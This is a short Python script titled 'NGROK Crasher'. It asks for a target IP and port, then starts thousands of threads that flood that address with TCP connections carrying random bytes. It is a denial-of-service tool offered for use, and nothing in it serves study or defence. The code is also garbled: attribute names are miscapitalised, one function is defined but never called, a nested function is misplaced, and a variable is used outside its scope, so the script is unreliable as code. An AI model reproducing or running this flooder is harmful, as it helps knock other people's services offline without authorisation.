import colorama
from colorama import Fore, Back, Style
import random
import socket
import threading

colorama.init()

print("NGROK Crasher")
ip = str(input(" IP:"))
port = int(input(" PORT:"))
date = int(input("Data(1024):"))

def run2():
	data = random._urandom(date)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(100):
				s.send(data)
			print(Fore.Blue + '[Payload]' + Fore.GREEN + '> Send Packet')
		except:
			s.close()
			print(Fore.BLUE + '[Payload]' + Fore.GREEN + '> Send Packet')

for y in range(1000):
		th = threading.Thread(target = run2)
		th.start()

def run3():
	data = random._urandom(date)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(1000):
				s.send(data)
			print(Fore.Blue + '[Payload]' + Fore.GREEN + '> Send Packet')
		except:
			s.close()
			print(Fore.BLUE + '[Payload]' + Fore.GREEN + '> Send Packet')

for y in range(1000):
		th = threading.Thread(target = run2)
		th.start()

		def run4():
			data = random._urandom(594)
i = random.choice(("[*]","[!]","[#]"))
while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(1000):
				s.send(data)
			print(Fore.Blue + '[Payload]' + Fore.GREEN + '> Send Packet')
		except:
			s.close()
			print(Fore.BLUE + '[Payload]' + Fore.GREEN + '> Send Packet')